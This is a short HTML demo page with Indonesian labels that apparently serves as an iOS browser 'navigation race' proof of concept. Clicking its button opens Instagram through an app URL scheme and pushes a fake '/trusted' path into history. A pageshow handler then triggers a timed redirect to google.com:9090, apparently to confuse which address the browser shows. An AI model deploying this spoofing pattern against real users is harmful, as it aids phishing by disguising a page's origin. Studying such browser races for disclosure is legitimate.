<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>iOS Open App + Panel + Navigation</title>
  <style>
    button {
      margin: 10px;
      padding: 12px 20px;
      font-size: 16px;
    }
    #panel {
      display: none;
      padding: 10px;
      border: 1px solid #ccc;
      margin-top: 10px;
    }
  </style>
</head>
<body>

<h2>Demo iOS: Buka Aplikasi + Panel + Navigation Race</h2>

<button id="allBtn">Lakukan Semua Aksi</button>
<div id="panel">Panel Terbuka!</div>

<script>
const allBtn = document.getElementById('allBtn');
const panel = document.getElementById('panel');

allBtn.onclick = () => {
  // --- Step 1: Buka aplikasi (Instagram) ---
  window.location = "instagram://app"; // bisa diganti aplikasi lain

  // --- Step 2: PushState + tampilkan panel ---
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
};

// --- Step 3: Navigation race (redirect) ---
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090';
      }, 80);
    });
  });
});
</script>

</body>
</html>
